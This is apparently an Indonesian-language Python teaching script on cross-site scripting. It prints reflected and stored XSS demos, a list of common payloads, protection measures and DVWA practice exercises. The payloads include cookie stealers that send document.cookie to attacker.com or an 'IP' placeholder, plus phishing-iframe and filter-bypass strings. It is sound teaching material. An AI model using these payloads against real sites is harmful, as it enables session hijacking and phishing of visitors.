#!/usr/bin/env python3
"""Sesi 14: XSS Demo - Simulasi Cross-Site Scripting"""
import html

def banner():
    print("="*60)
    print("  SESI 14: XSS - CROSS-SITE SCRIPTING")
    print("  Analogi: NYELUNDUPIN CATATAN ke papan pengumuman")
    print("="*60)

def demo_xss_reflected():
    print("\n[1] XSS REFLECTED")
    print("  Analogi: BISIKIN sesuatu ke kuping A. Cuma A yang denger.")
    print()
    
    user_input = "<script>alert('XSS Berhasil!')</script>"
    print(f"  Input user: {user_input}")
    print(f"  Output AMAN (html.escape): {html.escape(user_input)}")
    print(f"  Output RENTAN (langsung): {user_input}")
    print()
    print("  ❌ RENTAN: Output langsung tanpa filter")
    print("  ✅ AMAN: Output di-escape -> < > jadi &lt; &gt;")

def demo_xss_stored():
    print("\n[2] XSS STORED")
    print("  Analogi: NULIS DI BUKU TAMU. Semua yang baca kena.")
    print()
    
    guestbook = []
    # User jahat posting pesan
    jahat = "<script>document.location='http://attacker.com/?cookie='+document.cookie</script>"
    guestbook.append(jahat)
    guestbook.append("Halo, website keren!")
    guestbook.append("Saya suka konten ini")
    
    print(f"  Isi buku tamu ({len(guestbook)} pesan):")
    for i, msg in enumerate(guestbook, 1):
        safe = html.escape(msg)[:50]
        print(f"    {i}. {safe}")
    print()
    print("  Dampak: Script dijalankan di browser SETIAP pengunjung")
    print("  Akibat: Cookie dicuri, redirect ke phishing, deface")

def demo_payloads():
    print("\n[3] PAYLOAD XSS YANG SERING DIPAKAI")
    payloads = [
        ("Basic alert", "<script>alert('XSS')</script>"),
        ("Image error", "<img src=x onerror=alert(1)>"),
        ("Case bypass", "<ScRiPt>alert(1)</ScRiPt>"),
        ("HTML event", "<body onload=alert(1)>"),
        ("Cookie stealer", "<script>new Image().src='http://IP/?c='+document.cookie</script>"),
        ("Iframe phish", "<iframe src='http://phishing.com'></iframe>"),
    ]
    for name, payload in payloads:
        print(f"  {name:20}: {payload[:50]}")

def demo_perlindungan():
    print("\n[4] CARA MELINDUNGI DARI XSS")
    protections = [
        ("htmlspecialchars()", "Ubah < > & \" menjadi entity HTML"),
        ("Content Security Policy", "Header HTTP yang batasin script mana yang boleh jalan"),
        ("HttpOnly Cookie", "Cookie gak bisa dibaca JavaScript"),
        ("Filter Input", "Hapus tag HTML dari input user"),
        ("Encode Output", "Sesuai konteks (HTML, JS, URL, CSS)"),
    ]
    for name, desc in protections:
        print(f"  ✅ {name:25}: {desc}")

def main():
    banner()
    demo_xss_reflected()
    demo_xss_stored()
    demo_payloads()
    demo_perlindungan()
    print("\n" + "="*60)
    print("  LATIHAN:")
    print("  1. Coba XSS di DVWA: <script>alert(document.cookie)</script>")
    print("  2. Test reflected di parameter URL")
    print("  3. Coba bypass filter dengan <img src=x onerror=alert(1)>")
    print("="*60)

if __name__ == "__main__":
    main()
